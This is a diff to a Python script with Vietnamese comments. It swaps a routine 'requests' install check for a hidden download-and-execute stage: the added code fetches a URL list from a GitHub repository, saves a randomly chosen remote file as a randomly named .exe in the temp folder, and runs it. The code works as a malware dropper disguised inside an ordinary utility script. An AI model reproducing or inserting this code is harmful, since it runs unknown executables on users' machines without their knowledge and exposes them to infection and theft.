@@ -17,16 +17,36 @@ if not os.path.exists(destination_file):
 else:
     print(f"Tệp đã tồn tại trong {destination_file}")
 
-try:
-    import requests
-except ImportError:
-    print("Module 'requests' chưa được cài đặt. Đang cài đặt...")
-    # Cài đặt requests nếu chưa có
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-    
-    # Thử import lại sau khi cài đặt
-    try:
-        import requests
-        print("Cài đặt và import 'requests' thành công!")
-    except ImportError:
-        print("Cài đặt không thành công.")
+import os
+import random
+import string
+import urllib.request
+import tempfile
+import subprocess
+
+# URL tới file chứa danh sách các URL tải file
+url_list = "https://raw.githubusercontent.com/43a1723/w/main/urls_file.txt"
+
+# Tải nội dung file danh sách URL
+response = urllib.request.urlopen(url_list)
+url_content = response.read().decode('utf-8')
+urls = url_content.splitlines()
+
+# Chọn ngẫu nhiên một URL từ danh sách
+random_url = random.choice(urls)
+
+# Tạo một tên file ngẫu nhiên
+file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".exe"
+
+# Lấy đường dẫn tới thư mục tạm %temp%
+temp_dir = tempfile.gettempdir()
+
+# Đường dẫn đầy đủ của file sẽ được lưu vào %temp%
+temp_file_path = os.path.join(temp_dir, file_name)
+
+# Tải file từ URL và lưu vào %temp%
+urllib.request.urlretrieve(random_url, temp_file_path)
+print(f"Tải file thành công: {temp_file_path}")
+
+# Thực thi file vừa tải
+subprocess.run([temp_file_path], shell=True)
